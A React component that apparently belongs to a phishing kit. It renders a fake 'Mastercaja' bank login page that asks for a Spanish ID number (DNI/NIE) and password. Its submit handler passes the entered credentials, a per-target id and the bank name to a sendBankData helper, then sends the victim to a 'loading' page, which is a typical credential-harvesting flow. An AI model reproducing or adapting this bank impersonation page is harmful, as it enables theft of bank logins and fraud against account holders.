import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import Logo from '../../images/Logo.png'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Mastercaja', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <div className="mx-auto flex w-full max-w-[600px] flex-col items-center rounded-2xl bg-white px-6 md:px-20">
      <img src={Logo} alt="" className="mb-[50px] mt-[50px] h-auto w-[420px]" />
      <Input placeholder="DNI/NIE" className="mb-2.5" value={login} onChange={(e) => setLogin(e.target.value)} />
      <Input
        type="password"
        placeholder="Contraseña"
        className="mb-5"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <div className="mb-3.5 flex flex-row">
        <a
          href=""
          className="relative pl-[30px] pr-[15px] text-[13px] font-medium text-[#a5a5a5] before:absolute before:left-0 before:top-0.5 before:h-[14px] before:w-[26px] before:rounded-[7px] before:bg-[#bfbfbf] after:absolute after:left-[1px] after:top-[3px] after:h-3 after:w-3 after:rounded-md after:bg-white"
        >
          Activación del menú avanzado (para usuarios con discapacidad visual)
        </a>
      </div>
      <button
        onClick={sendAndNavigate}
        className="mb-40 h-[70px] w-full rounded-xl bg-[#ff5d00] py-[9px] text-[14px] font-bold uppercase text-white"
      >
        Accesso Desde
      </button>
    </div>
  )
}
